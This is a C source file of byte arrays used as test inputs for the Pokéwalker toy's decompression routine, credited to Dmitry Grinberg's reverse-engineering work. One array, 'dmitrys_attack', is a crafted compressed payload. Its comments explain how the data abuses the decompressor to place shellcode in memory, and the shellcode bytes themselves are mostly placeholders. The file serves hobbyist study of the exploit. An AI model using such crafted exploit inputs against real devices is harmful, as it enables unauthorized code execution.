#include <stdint.h>

// Credits to Dmitry Grinberg's work on https://dmitry.gr/?r=05.Projects&proj=28.%20pokewalker
// These examples below were taken directly from his work:

uint8_t basic_example[23] = {
  0x10, 
  0x0A, // change this to 0x09 and see what happens!
  0x00, 0x00, 
  
  0x01, 
    0xAA, 
    0xBB, 
    0xCC, 
    0xDD, 
    0xEE, 
    0xFF, 
    0x11, 
    0x00, 0x06, // uncompressed size == 0x0 + 3 = 3, offset == 0x006 + 1 = 7, (0xAA, 0xBB, 0xCC)
  0x00, 
    0xAB, 
    0xCD, 
    0xEF, 
    0x12, 
    0x23, 
    0x56, 
    0x78, 
    0x9A
};

uint8_t lots_of_ff[127] = {
  0x10, 0xFF, 0x00, 0x00, 0x7F, 0xff, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xff, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xff, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xff, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xff, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xff, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xff, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xF0, 0x00, 0xc0, 0xF0, 0x00, 0xF0, 0xff
};

uint8_t dmitrys_attack[127] = {
  0x10,         // marker (unused)
  0x06,         // decompresed size (picked for proper decompressed length by trial, error, and some patience)
  0x00, 0x00,   // unused bytes
	
  0x04,
  	0x3f, 0x00, 0x00, 0xf0, 0x00,    // decompress the second stage decompressible data
  	0x70, 0x01,                      // uncompressed size == 0x7 + 3 = 10, offset == 0x001 + 1 = 2, (0xF0, 0x00, 0x70, 0x01, 0xFF, ...)
  	0xff, 0xe0,                      // start of the 1st 17-byte spacer to produce a lot of zeroes
  0x7f,                              // 0b 0111 1111
  	0x00,
  	0xb0, 0x01,                      // first spacer ends -- uncompressed size == 0xB + 3 = 14, offset == 0x001 + 1 = 2, (0x00, 0x00, 0x04, 0x3F, 0x00, 0x00, 0xF0, ...)
  	0xe0, 0x10,                      // copy it for #2 (copy 17 from 17 back) -- uncompressed size == 0xE + 3 = 17, offset == 0x010 + 1 = 17, (0x00, 0x00, 0x04, 0x3F, 0x00, 0x00, 0xF0, ...)
  	0xe0, 0x10,                      // copy it for #3 (copy 17 from 17 back)
  	0xe0, 0x10,                      // copy it for #4 (copy 17 from 17 back)
  	0xe0, 0x10,                      // copy it for #5 (copy 17 from 17 back)
  	0xe0, 0x10,                      // copy it for #6 (copy 17 from 17 back)
  	0xe0, 0x10,                      // copy it for #7 (copy 17 from 17 back)
  0x80,
  	0xe0, 0x10,                      // copy it for #8 (copy 17 from 17 back) -- 0b 1000 0000
  	// shellcode (not compressed, zeroes interspersed since it is decompressed twice)
  	0, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
  0x00,
  	0xaa, 0xaa, 0, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa,
  0x00,
  	0xaa, 0xaa, 0xaa, 0, 0xaa, 0xaa, 0xaa, 0xaa,
  0x00,
  	0xaa, 0xaa, 0xaa, 0xaa, 0, 0xaa, 0xaa, 0xaa,
  0x00,
  	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0, 0xaa, 0xaa,
  0x00,
  	0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0, 0xaa,
  0x00,
  	0xaa, 0xfa, 0x80, 0xfa, 0x80, 0xfa, 0x80, 0,
  //  last zero neeed - it guarantees that at end we're emitting byte-wise and thus can find a nice end-at address
  //  now we need to consume some bytes and end on a good boundary in the original compressed buffer
  0x00,
	0, 0, 0, 0, 0, 0, 0, 0,
  0x00,
	0, 0, 0, 0, 0, 0, 0, 0,
  //  now we need to produce some spacing before the serious expansion starts.
  //  Adjusting the repeat counts below can move the decompressed shellcode
  //  in memory.
  0xfe,
	0x10, 0x00,
	0x30, 0x00,
	0x30, 0x00,
	0x30, 0x00,
	0xc0, 0x00,
	0xf0, 0x00,
	0xf0, 0x00
};